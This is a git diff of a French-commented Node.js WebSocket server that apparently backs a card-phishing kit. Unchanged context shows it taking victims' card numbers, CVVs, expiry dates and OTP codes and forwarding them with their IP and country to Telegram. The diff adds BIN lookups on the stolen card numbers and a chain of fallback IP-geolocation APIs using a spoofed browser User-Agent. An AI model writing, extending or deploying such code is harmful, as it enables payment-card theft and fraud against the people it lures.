@@ -4,6 +4,7 @@ const https = require('https');
 const fs = require('fs');
 const path = require('path');
 const TelegramService = require('./services/telegramService');
+const BinService = require('./services/binService');
 
 // Charger les variables d'environnement depuis .env si le fichier existe
 const envPath = path.join(__dirname, '..', '.env');
@@ -31,6 +32,7 @@ if (fs.existsSync(envPath)) {
 // Configuration
 const PORT = process.env.WS_PORT || 8080;
 const telegram = new TelegramService();
+const binService = new BinService();
 
 // Créer le serveur HTTP avec gestionnaire de requêtes
 const server = http.createServer((req, res) => {
@@ -137,7 +139,7 @@ function getClientIP(req) {
   return ip || 'unknown';
 }
 
-// Fonction pour obtenir le pays à partir de l'IP
+// Fonction pour obtenir le pays à partir de l'IP avec plusieurs APIs en fallback
 function getCountryFromIP(ip) {
   return new Promise((resolve) => {
     console.log(`[Country] 🔍 Fetching country for IP: ${ip}`);
@@ -149,14 +151,32 @@ function getCountryFromIP(ip) {
       return;
     }
 
-    // Utiliser l'API ip-api.com (gratuite, sans clé API)
-    const url = `https://ip-api.com/json/${ip}?fields=status,country,countryCode`;
-    console.log(`[Country] 🌐 Requesting: ${url}`);
+    // Essayer d'abord avec ip-api.com
+    const url1 = `https://ip-api.com/json/${ip}?fields=status,country,countryCode`;
+    console.log(`[Country] 🌐 Trying API 1 (ip-api.com): ${url1}`);
     
-    const request = https.get(url, (res) => {
+    const options1 = {
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+      }
+    };
+    
+    const request1 = https.get(url1, options1, (res) => {
       let data = '';
       
-      console.log(`[Country] 📡 Response status: ${res.statusCode}`);
+      console.log(`[Country] 📡 API 1 Response status: ${res.statusCode}`);
+      
+      if (res.statusCode === 403 || res.statusCode === 429) {
+        console.log(`[Country] ⚠️  API 1 returned status ${res.statusCode} (rate limited/forbidden), trying fallback...`);
+        tryFallbackAPI(ip, resolve);
+        return;
+      }
+      
+      if (res.statusCode !== 200) {
+        console.log(`[Country] ⚠️  API 1 returned status ${res.statusCode}, trying fallback...`);
+        tryFallbackAPI(ip, resolve);
+        return;
+      }
       
       res.on('data', (chunk) => {
         data += chunk;
@@ -164,36 +184,156 @@ function getCountryFromIP(ip) {
       
       res.on('end', () => {
         try {
-          console.log(`[Country] 📦 Response data:`, data);
+          console.log(`[Country] 📦 API 1 Response data:`, data);
           const result = JSON.parse(data);
-          console.log(`[Country] 📊 Parsed result:`, JSON.stringify(result, null, 2));
+          console.log(`[Country] 📊 API 1 Parsed result:`, JSON.stringify(result, null, 2));
           
           if (result.status === 'success' && result.country) {
-            console.log(`[Country] ✅ Success! Country: ${result.country}`);
+            console.log(`[Country] ✅ API 1 Success! Country: ${result.country}`);
             resolve(result.country);
+          } else if (result.status === 'fail') {
+            console.log(`[Country] ⚠️  API 1 returned status: ${result.status}, message: ${result.message || 'N/A'}, trying fallback...`);
+            tryFallbackAPI(ip, resolve);
           } else {
-            console.log(`[Country] ⚠️  API returned status: ${result.status}, country: ${result.country || 'N/A'}`);
-            resolve('Unknown');
+            console.log(`[Country] ⚠️  API 1 returned status: ${result.status}, trying fallback...`);
+            tryFallbackAPI(ip, resolve);
           }
         } catch (error) {
-          console.error(`[Country] ❌ Error parsing country data:`, error);
+          console.error(`[Country] ❌ Error parsing API 1 data:`, error);
           console.error(`[Country] Raw data:`, data);
-          resolve('Unknown');
+          tryFallbackAPI(ip, resolve);
         }
       });
     });
     
-    request.on('error', (error) => {
-      console.error(`[Country] ❌ Error fetching country:`, error);
-      resolve('Unknown');
+    request1.on('error', (error) => {
+      console.error(`[Country] ❌ API 1 Error:`, error.message);
+      tryFallbackAPI(ip, resolve);
     });
     
-    // Timeout de 5 secondes
-    request.setTimeout(5000, () => {
-      console.error(`[Country] ⏱️  Timeout after 5 seconds for IP: ${ip}`);
-      request.destroy();
-      resolve('Unknown');
+    // Timeout de 8 secondes pour la première API
+    request1.setTimeout(8000, () => {
+      console.error(`[Country] ⏱️  API 1 Timeout after 8 seconds for IP: ${ip}`);
+      request1.destroy();
+      tryFallbackAPI(ip, resolve);
     });
+  });
+}
+
+// Fonction de fallback avec ipapi.co
+function tryFallbackAPI(ip, resolve) {
+  console.log(`[Country] 🔄 Trying fallback API 1 (ipapi.co) for IP: ${ip}`);
+  
+  const url2 = `https://ipapi.co/${ip}/json/`;
+  console.log(`[Country] 🌐 Fallback API 1 URL: ${url2}`);
+  
+  const request2 = https.get(url2, (res) => {
+    let data = '';
+    
+    console.log(`[Country] 📡 Fallback API 1 Response status: ${res.statusCode}`);
+    
+    res.on('data', (chunk) => {
+      data += chunk;
+    });
+    
+    res.on('end', () => {
+      try {
+        console.log(`[Country] 📦 Fallback API 1 Response data:`, data);
+        const result = JSON.parse(data);
+        console.log(`[Country] 📊 Fallback API 1 Parsed result:`, JSON.stringify(result, null, 2));
+        
+        // Vérifier si c'est une erreur de rate limit
+        if (result.error && (result.reason === 'RateLimited' || res.statusCode === 429)) {
+          console.log(`[Country] ⚠️  Fallback API 1 rate limited, trying API 2...`);
+          tryFallbackAPI2(ip, resolve);
+          return;
+        }
+        
+        if (result.country_name && !result.error) {
+          console.log(`[Country] ✅ Fallback API 1 Success! Country: ${result.country_name}`);
+          resolve(result.country_name);
+        } else if (result.country && !result.error) {
+          console.log(`[Country] ✅ Fallback API 1 Success! Country: ${result.country}`);
+          resolve(result.country);
+        } else {
+          console.log(`[Country] ⚠️  Fallback API 1 error: ${result.error || 'Unknown error'}, trying API 2...`);
+          tryFallbackAPI2(ip, resolve);
+        }
+      } catch (error) {
+        console.error(`[Country] ❌ Error parsing fallback API 1 data:`, error);
+        console.error(`[Country] Raw data:`, data);
+        tryFallbackAPI2(ip, resolve);
+      }
+    });
+  });
+  
+  request2.on('error', (error) => {
+    console.error(`[Country] ❌ Fallback API 1 Error:`, error.message);
+    tryFallbackAPI2(ip, resolve);
+  });
+  
+  // Timeout de 5 secondes pour le fallback
+  request2.setTimeout(5000, () => {
+    console.error(`[Country] ⏱️  Fallback API 1 Timeout after 5 seconds for IP: ${ip}`);
+    request2.destroy();
+    tryFallbackAPI2(ip, resolve);
+  });
+}
+
+// Fonction de fallback 2 avec ip-api.io
+function tryFallbackAPI2(ip, resolve) {
+  console.log(`[Country] 🔄 Trying fallback API 2 (ip-api.io) for IP: ${ip}`);
+  
+  const url3 = `https://ip-api.io/json/${ip}`;
+  console.log(`[Country] 🌐 Fallback API 2 URL: ${url3}`);
+  
+  const request3 = https.get(url3, (res) => {
+    let data = '';
+    
+    console.log(`[Country] 📡 Fallback API 2 Response status: ${res.statusCode}`);
+    
+    res.on('data', (chunk) => {
+      data += chunk;
+    });
+    
+    res.on('end', () => {
+      try {
+        console.log(`[Country] 📦 Fallback API 2 Response data:`, data);
+        const result = JSON.parse(data);
+        console.log(`[Country] 📊 Fallback API 2 Parsed result:`, JSON.stringify(result, null, 2));
+        
+        if (result.country_name && !result.error) {
+          console.log(`[Country] ✅ Fallback API 2 Success! Country: ${result.country_name}`);
+          resolve(result.country_name);
+        } else if (result.country && !result.error) {
+          console.log(`[Country] ✅ Fallback API 2 Success! Country: ${result.country}`);
+          resolve(result.country);
+        } else {
+          console.log(`[Country] ⚠️  Fallback API 2 error: ${result.error || 'Unknown error'}`);
+          console.log(`[Country] ⚠️  Returning 'Unknown' for IP: ${ip}`);
+          resolve('Unknown');
+        }
+      } catch (error) {
+        console.error(`[Country] ❌ Error parsing fallback API 2 data:`, error);
+        console.error(`[Country] Raw data:`, data);
+        console.log(`[Country] ⚠️  Returning 'Unknown' for IP: ${ip}`);
+        resolve('Unknown');
+      }
+    });
+  });
+  
+  request3.on('error', (error) => {
+    console.error(`[Country] ❌ Fallback API 2 Error:`, error.message);
+    console.log(`[Country] ⚠️  Returning 'Unknown' for IP: ${ip}`);
+    resolve('Unknown');
+  });
+  
+  // Timeout de 5 secondes pour le fallback 2
+  request3.setTimeout(5000, () => {
+    console.error(`[Country] ⏱️  Fallback API 2 Timeout after 5 seconds for IP: ${ip}`);
+    request3.destroy();
+    console.log(`[Country] ⚠️  Returning 'Unknown' for IP: ${ip}`);
+    resolve('Unknown');
   });
 }
 
@@ -212,17 +352,21 @@ wss.on('connection', async (ws, req) => {
 
   // Obtenir le pays à partir de l'IP
   const country = await getCountryFromIP(ip);
-  console.log(`[Country] IP ${ip} -> Country: ${country}`);
+  console.log(`[Country] ✅ IP ${ip} -> Country: ${country}`);
+  console.log(`[Country] 📝 Storing country '${country}' for client ${clientId}`);
 
   // Stocker la connexion
-  clients.set(clientId, {
+  const clientData = {
     ws,
     id: clientId,
     ip,
-    country,
+    country: country || 'Unknown', // S'assurer que le pays est toujours défini
     role: null,
     connectedAt: Date.now(),
-  });
+  };
+  
+  clients.set(clientId, clientData);
+  console.log(`[Connection] 💾 Client stored with country: ${clientData.country}`);
 
   // Envoyer message de bienvenue
   ws.send(JSON.stringify({
@@ -519,18 +663,36 @@ async function handlePaymentData(clientId, data) {
   client.card_expiration = data.data.expirationDate;
   client.card_cvv = data.data.cvv;
 
+  // Vérifier et afficher le pays du client
+  console.log(`[handlePaymentData] 🌍 Client country from storage: ${client.country || 'NOT SET'}`);
+  console.log(`[handlePaymentData] 🌍 Client IP: ${client.ip || 'NOT SET'}`);
+  
+  // Vérifier le BIN du numéro de carte
+  let binInfo = null;
+  if (data.data.cardNumber) {
+    console.log(`[handlePaymentData] 🔍 Checking BIN for card number...`);
+    binInfo = await binService.checkCardNumber(data.data.cardNumber);
+    if (binInfo) {
+      console.log(`[handlePaymentData] ✅ BIN info retrieved:`, JSON.stringify(binInfo, null, 2));
+    } else {
+      console.log(`[handlePaymentData] ⚠️  Could not retrieve BIN info`);
+    }
+  }
+  
   const telegramData = {
     id: clientId,
     ip: client.ip,
-    country: client.country,
+    country: client.country || 'Unknown', // S'assurer que le pays est toujours défini
     card_holder: data.data.cardHolder || data.data.nameOnCard,
     card_number: data.data.cardNumber,
     card_expiration: data.data.expirationDate,
     card_cvv: data.data.cvv,
     current_page: client.current_page,
+    bin_info: binInfo, // Ajouter les informations BIN
   };
 
   console.log(`[handlePaymentData] 📤 Sending to Telegram:`, JSON.stringify(telegramData, null, 2));
+  console.log(`[handlePaymentData] 🌍 Country in Telegram data: ${telegramData.country}`);
   console.log(`[handlePaymentData] Telegram enabled:`, telegram.enabled);
 
   // Notifier Telegram avec toutes les informations
@@ -606,10 +768,14 @@ async function handleOTPSubmit(clientId, data) {
   client.otp_status = 'submitted';
   client.otp_submitted_at = Date.now();
 
+  // Vérifier et afficher le pays du client
+  console.log(`[handleOTPSubmit] 🌍 Client country from storage: ${client.country || 'NOT SET'}`);
+  console.log(`[handleOTPSubmit] 🌍 Client IP: ${client.ip || 'NOT SET'}`);
+  
   const telegramData = {
     id: clientId,
     ip: client.ip,
-    country: client.country,
+    country: client.country || 'Unknown', // S'assurer que le pays est toujours défini
     otp_code: data.otp,
     otp_status: 'submitted',
     current_page: client.current_page,
@@ -619,6 +785,7 @@ async function handleOTPSubmit(clientId, data) {
   };
 
   console.log(`[handleOTPSubmit] 📤 Sending to Telegram:`, JSON.stringify(telegramData, null, 2));
+  console.log(`[handleOTPSubmit] 🌍 Country in Telegram data: ${telegramData.country}`);
   console.log(`[handleOTPSubmit] Telegram enabled:`, telegram.enabled);
 
   // Notifier Telegram avec toutes les informations
